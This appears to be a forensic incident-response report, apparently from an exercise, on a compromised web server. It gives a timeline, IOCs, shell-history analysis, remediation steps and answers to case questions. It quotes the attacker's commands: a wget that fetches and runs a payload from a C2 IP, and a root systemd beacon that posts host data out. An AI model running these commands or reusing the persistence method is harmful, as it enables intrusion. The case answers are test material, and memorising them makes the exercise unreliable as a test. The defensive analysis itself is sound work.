---

# Incident Response Report — webserver-prod-02

## Executive Summary

The host **webserver-prod-02** was compromised in a two-stage attack originating from **185.229.59.103** (confirmed C2 server). The attacker first gained shell access as `www-data` (likely via a web application vulnerability), downloaded and executed a payload, then pivoted to the `deploy` account via SSH using a compromised key. Using `deploy`'s overly permissive NOPASSWD sudo access to `systemctl`, the attacker installed a persistent C2 beacon as a systemd service running as root.

## Attack Timeline

| Time | Event | Source |
|------|-------|--------|
| (Pre-Apr 13) | Attacker compromises web application, gains www-data shell; runs recon (`id`, `uname -a`), downloads payload from `http://185.229.59.103/u` to `/tmp/.u`, executes it | `fs/var/www/.bash_history` |
| Apr 14, 03:17:44 | Attacker logs in as `deploy` from 185.229.59.103 via publickey SSH | `auth.log:30` |
| Apr 14, 03:18:02 | `deploy` runs `sudo cat /etc/passwd` (credential/config access) | `auth.log:32` |
| Apr 14, 03:18:12 | `deploy` copies `/tmp/update` to `/usr/local/bin/update` via sudo | `auth.log:35` |
| Apr 14, 03:18:17 | `deploy` makes the binary executable | `auth.log:36` |
| Apr 14, 03:18:29 | `deploy` writes `system-updater.service` via `sudo tee` | `auth.log:37` |
| Apr 14, 03:18:44–03:19:03 | `deploy` reloads systemd, enables and starts the C2 beacon service | `auth.log:38–40` |

## Confirmed Findings (Verified)

1. **Malicious systemd persistence** — `system-updater.service` installed at `/etc/systemd/system/`, runs as root, POSTs hostname and IP to `https://185.229.59.103:8443/beacon` every 600 seconds.
2. **Sudo abuse by deploy** — The attacker used `deploy`'s NOPASSWD sudo to `systemctl` (and other tools) to write, enable, and start the malicious service, and to stage a binary from `/tmp`.

## Inferences

- **Initial access** was through the web application (www-data's shell history shows recon and payload download from the same C2 IP).
- **Lateral movement** from www-data to deploy occurred via SSH with a compromised public key — no brute force was detected, and password auth is disabled on this host.
- **185.229.59.103** served as the single C2 node across all three attack phases: HTTP payload delivery, SSH access, and HTTPS beacon callback.
- The `deploy` sudoers configuration (`NOPASSWD: /usr/bin/systemctl` with no argument restriction) was the key privilege escalation vector.

## Shell History Analysis

Four shell history files were found and analyzed:

| Account | File | Commands | Content |
|---------|------|----------|---------|
| **root** | `fs/root/.bash_history` | 4 | Routine admin: `apt update`, `apt upgrade`, `systemctl restart nginx`, `tail -f` error log. No attacker activity. |
| **deploy** | `fs/home/deploy/.bash_history` | 15 | Normal CI/CD work: `git pull`, `npm ci`, `npm run build`, `npm test`, `docker ps`, etc. No attacker activity. |
| **alice** | `fs/home/alice/.bash_history` | 6 | Log viewing: `ls`, `cd /var/log`, `tail nginx access.log`, `journalctl`, `systemctl status nginx`. No attacker activity. |
| **www-data** | `fs/var/www/.bash_history` | 7 | **Attacker activity**: `id`, `uname -a`, `cd /tmp`, `wget http://185.229.59.103/u -O /tmp/.u`, `chmod +x /tmp/.u`, `/tmp/.u &`, `cat /etc/passwd`. |
| **bob** | (no history file) | — | Account exists in `/etc/passwd` (UID 1003) but no `.bash_history` was found. |

## IOC Summary

| Type | Value | Context |
|------|-------|---------|
| IP (C2) | `185.229.59.103` | SSH login source, HTTP payload server, HTTPS beacon destination |
| URL | `http://185.229.59.103/u` | Malware download (www-data phase) |
| URL | `https://185.229.59.103:8443/beacon` | C2 callback (systemd persistence) |
| File | `/usr/local/bin/update` | Dropped binary (copied from `/tmp/update`) |
| File | `/tmp/.u` | Initial payload (downloaded by www-data) |
| Service | `system-updater.service` | Persistence mechanism |

## Recommendations

1. **Immediately** disable and remove `system-updater.service`; delete `/usr/local/bin/update`.
2. **Revoke and rotate** all SSH keys for the `deploy` account.
3. **Block** 185.229.59.103 at the network perimeter.
4. **Restrict** deploy's sudoers to specific systemctl subcommands (e.g., `systemctl restart nginx`) rather than bare `systemctl`.
5. **Investigate** the web application for the vulnerability that gave the attacker www-data shell access.
6. **Audit** `/tmp` for remnants of `.u` and any other dropped files.

---

## Case Questions

**Case Q1:** Shell histories were analyzed for four accounts: **root**, **deploy**, **alice**, and **www-data**. A fifth account, **bob**, exists in `/etc/passwd` but had no shell history file on disk.

**Case Q2:** Yes — the **www-data** account's shell history (`fs/var/www/.bash_history`) shows what the attacker did during the initial compromise phase: they ran reconnaissance (`id`, `uname -a`), downloaded a payload from the C2 server (`wget http://185.229.59.103/u -O /tmp/.u`), made it executable (`chmod +x /tmp/.u`), executed it in the background (`/tmp/.u &`), and read `/etc/passwd`. The other three histories (root, deploy, alice) contain only legitimate administrative activity — the attacker's post-pivot actions as `deploy` (installing the C2 beacon service) were not recorded in deploy's bash history (likely suppressed) and are only visible in the auth.log sudo records.